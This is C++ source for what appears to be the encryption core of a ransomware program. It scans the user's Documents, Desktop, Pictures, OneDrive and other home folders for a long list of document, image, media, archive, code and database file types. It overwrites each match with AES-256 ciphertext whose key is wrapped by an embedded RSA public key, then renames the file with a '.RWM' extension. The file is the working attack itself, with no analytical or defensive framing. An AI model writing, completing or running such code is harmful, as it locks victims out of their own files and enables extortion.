#include <iostream>
#include <fstream>
#include <vector>
#include <set>
#include <cctype>
#include <cstdlib>
#include <algorithm>
#include <filesystem>
#include <string>
#include <cstring>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>

namespace fs = std::filesystem;

const std::string extension = ".RWM";
const int RSA_KEY_SIZE = 2048;

// Public key in PEM format (replace with your actual public key)
const std::string public_key_pem = R"(
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwJtyMJDx5n1onbYdXzNT
zutPNOVMpQveVnS6IBflNoH4P0AuWuMSZ5J61BLYtEx7DaIyCGqY6nRvTIzWzIoO
UB61p1xjdpmveRmeydKA+/wzr3ZKXGD1vN0ctQgn6kXqeqTGyZ8fwt44Ny9Ags7Z
PgHVH1eAFDmYXoYZ4v0eEBGDyv1PbH6nYx52kkzFHfA4cDEI/DY2x21x05iOn6To
0DiRcWIOq8jM+19b6kHByJ9zjvhCGwEAhQhRdGzt83gn+b6q3NW5SyZ5y0c44y/D
YJAgSAV4YkmTlaeD6CNQAN1V0TNS5iAEtZsdlAfWeKMfCcx62oJRbFx0EcANiOes
pQIDAQAB
-----END PUBLIC KEY-----
)";

// Target file extensions (case-insensitive)
const std::set<std::string> TargetExtensions = {
    ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".rtf", ".txt", ".odt", ".ods", ".odp", ".tex", ".log", ".csv", ".accd", ".accdb",

    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".psd", ".ai", ".svg", ".raw", ".cr2", ".nef",

    ".mp3", ".wav", ".flac", ".midi", ".ogg",

    ".avi", ".mov", ".mp4", ".mpeg", ".mpeg2", ".mpeg3", ".mpg", ".mkv", ".flv", ".3gp", ".m4v", ".wmv",

    ".zip", ".rar", ".7z", ".tar", ".gz", ".bak", ".backup", ".wbcat",

    ".py", ".html", ".htm", ".php", ".js", ".css", ".cpp", ".c", ".java", ".cs", ".vb", ".asp", ".aspx", ".cgi", ".pl",

    ".sql", ".db", ".dbf", ".mdb", ".accdb", ".accd"
};

// Folders to scan (relative to user home)
const std::vector<std::string> Folders = {
    "Documents",
    "Downloads",
    "Favorites",
    "Links",
    "Music",
    "Pictures",
    "Saved Games",
    "Videos",
    "OneDrive",
    "Desktop"
};

// Check if file has target extension (case-insensitive)
bool checkFileExtension(const std::string& filename) {
    std::string file = filename;
    std::transform(file.begin(), file.end(), file.begin(), 
        [](unsigned char c){ return std::tolower(c); });
    
    for (const auto& ext : TargetExtensions) {
        if (file.length() >= ext.length() && 
            file.compare(file.length() - ext.length(), ext.length(), ext) == 0) {
            return true;
        }
    }
    return false;
}

// Read entire file into byte vector
std::vector<unsigned char> readFile(const std::string& path) {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file) throw std::runtime_error("Cannot open file: " + path);
    
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::vector<unsigned char> buffer(size);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        throw std::runtime_error("Read failed: " + path);
    }
    return buffer;
}

// Write byte vector to file
void writeFile(const std::string& path, const std::vector<unsigned char>& data) {
    std::ofstream file(path, std::ios::binary);
    if (!file) throw std::runtime_error("Cannot create file: " + path);
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
}

// Encrypt file using hybrid RSA/AES approach
std::string encryptFile(RSA* rsa, const std::string& filePath) {
    // Generate random AES key and IV
    std::vector<unsigned char> aes_key(32); // 256-bit key
    std::vector<unsigned char> iv(16);      // 128-bit IV
    
    if (RAND_bytes(aes_key.data(), aes_key.size()) != 1 ||
        RAND_bytes(iv.data(), iv.size()) != 1) {
        throw std::runtime_error("Random generation failed");
    }

    // Read plaintext
    std::vector<unsigned char> plaintext = readFile(filePath);

    // Encrypt plaintext with AES
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) throw std::runtime_error("Context creation failed");
    
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key.data(), iv.data()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Encryption init failed");
    }

    std::vector<unsigned char> ciphertext(plaintext.size() + EVP_CIPHER_block_size(EVP_aes_256_cbc()));
    int out_len1 = 0, out_len2 = 0;
    
    if (EVP_EncryptUpdate(ctx, ciphertext.data(), &out_len1, plaintext.data(), plaintext.size()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Encryption update failed");
    }
    
    if (EVP_EncryptFinal_ex(ctx, ciphertext.data() + out_len1, &out_len2) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Encryption finalize failed");
    }
    
    EVP_CIPHER_CTX_free(ctx);
    ciphertext.resize(out_len1 + out_len2);

    // Encrypt AES key with RSA
    int rsa_len = RSA_size(rsa);
    std::vector<unsigned char> rsa_encrypted(rsa_len);
    int result = RSA_public_encrypt(
        aes_key.size(),
        aes_key.data(),
        rsa_encrypted.data(),
        rsa,
        RSA_PKCS1_PADDING
    );
    
    if (result != rsa_len) {
        throw std::runtime_error("RSA encryption failed");
    }

    // Combine RSA-encrypted key + IV + AES ciphertext
    std::vector<unsigned char> output;
    output.reserve(rsa_encrypted.size() + iv.size() + ciphertext.size());
    output.insert(output.end(), rsa_encrypted.begin(), rsa_encrypted.end());
    output.insert(output.end(), iv.begin(), iv.end());
    output.insert(output.end(), ciphertext.begin(), ciphertext.end());

    // Write encrypted data
    writeFile(filePath, output);

    // Rename with new extension
    std::string newPath = filePath + extension;
    fs::rename(filePath, newPath);
    return newPath;
}

void startEncrypting(RSA* rsa) {
    // Get user's home directory
    const char* homeDir = nullptr;
    #ifdef _WIN32
        homeDir = std::getenv("USERPROFILE");
    #else
        homeDir = std::getenv("HOME");
    #endif
    
    if (!homeDir) {
        std::cerr << "ERROR: Could not find home directory" << std::endl;
        return;
    }

    for (const auto& folder : Folders) {
        fs::path fullPath = fs::path(homeDir) / folder;
        
        if (!fs::exists(fullPath)) continue;
        
        try {
            for (const auto& entry : fs::recursive_directory_iterator(fullPath)) {
                if (!entry.is_regular_file()) continue;
                
                std::string path_str = entry.path().string();
                if (checkFileExtension(path_str)) {
                    try {
                        std::string new_path = encryptFile(rsa, path_str);
                        std::cout << "SUCCESS: File Encrypted: " << new_path << std::endl;
                    } catch (const std::exception& e) {
                        std::cerr << "ERROR: " << e.what() << " - " << path_str << std::endl;
                    }
                }
            }
        } catch (const fs::filesystem_error& e) {
            std::cerr << "WARNING: " << e.what() << std::endl;
        }
    }
}

int main() {
    // Initialize OpenSSL
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();
    
    // Load RSA public key
    BIO* bio = BIO_new_mem_buf(public_key_pem.data(), public_key_pem.size());
    if (!bio) {
        std::cerr << "ERROR: Failed to create BIO" << std::endl;
        return 1;
    }
    
    RSA* rsa = PEM_read_bio_RSA_PUBKEY(bio, nullptr, nullptr, nullptr);
    BIO_free(bio);
    
    if (!rsa) {
        std::cerr << "ERROR: Failed to load RSA public key" << std::endl;
        ERR_print_errors_fp(stderr);
        return 1;
    }
    
    std::cout << "---------------------------" << std::endl;
    startEncrypting(rsa);
    std::cout << "---------------------------" << std::endl;
    
    // Cleanup
    RSA_free(rsa);
    EVP_cleanup();
    ERR_free_strings();
    
    return 0;
}